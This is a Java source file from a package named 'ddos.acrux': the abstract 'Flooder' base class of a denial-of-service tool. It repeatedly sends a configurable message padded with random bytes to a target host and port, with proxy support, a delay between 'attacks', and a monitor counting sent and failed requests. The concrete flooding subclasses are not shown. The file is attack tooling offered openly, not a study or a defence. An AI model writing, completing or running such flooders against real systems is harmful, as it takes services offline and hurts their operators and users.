package ddos.acrux;

import java.io.IOException;
import java.net.*;
import java.util.Random;

/**
 *
 * @author acrux
 */
public abstract class Flooder implements Runnable {

    Random random = new Random();
    private FlooderMonitor monitor = null;
    private SocketAddress host;
    private Proxy proxy = null;
    private long delay = 0;
    int timeout = 9000;
    private int floodCount = 0;
    private boolean stop;
    boolean randomMessage = false;
    String message = "";
    private boolean isFlooding;

    public Flooder(SocketAddress host) {
        this.host = host;
    }

    public Flooder(InetAddress ip, int port) {
        this(new InetSocketAddress(ip, port));
    }

    public Flooder(String hostname, int port) {
        this(new InetSocketAddress(hostname, port));
    }

    abstract void flood() throws IOException;

    @Override
    public void run() {
        isFlooding = true;
        stop = false;

        while (!stop) {
            try {
                flood();
                floodCount++;
                if (monitor != null) {
                    monitor.requested();
                }
            } catch (ConnectException ce) {
                if (monitor != null) {
                    monitor.failed();
                }
                stop();
            } catch (IOException e) {
                if (monitor != null) {
                    monitor.failed();
                }
                //e.printStackTrace();

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
                }
            }
            try {
                Thread.sleep(delay);
            } catch (InterruptedException e) {
            }

        }
        isFlooding = false;
    }

    public boolean isFlooding() {
        return isFlooding;
    }

    public int getFloodCount() {
        return floodCount;
    }

    public SocketAddress getHost() {
        return host;
    }

    public void setProxy(Proxy proxy) {
        this.proxy = proxy;
    }

    public Proxy getProxy() {
        return proxy;
    }

    /**
     * Write this to the target.
     *
     * @param message
     */
    public void setMessage(String message) {
        this.message = message;
    }

    public void setRandomMessage(boolean random) {
        randomMessage = random;
    }

    /**
     * Wait between attacks
     *
     * @param delay time to wait in milliseconds
     */
    public void setDelay(long delay) {
        this.delay = delay;
    }

    public long getDelay() {
        return delay;
    }

    public void setTimeout(int timeout) {
        this.timeout = timeout;
    }

    public void stop() {
        stop = true;
    }

    public void setFlooderMonitor(FlooderMonitor monitor) {
        this.monitor = monitor;
    }

    /**
     * Creates data out of a message and random bytes.
     *
     * @return
     */
    byte[] getData(int randLength) {
        byte[] data;
        if (randomMessage) {
            byte[] m = message.getBytes();
            byte[] rand = new byte[randLength];
            random.nextBytes(rand);
            data = new byte[m.length + rand.length];
            System.arraycopy(m, 0, data, 0, m.length);
            System.arraycopy(rand, 0, data, m.length, rand.length);
        } else {
            data = message.getBytes();
        }
        return data;
    }
}
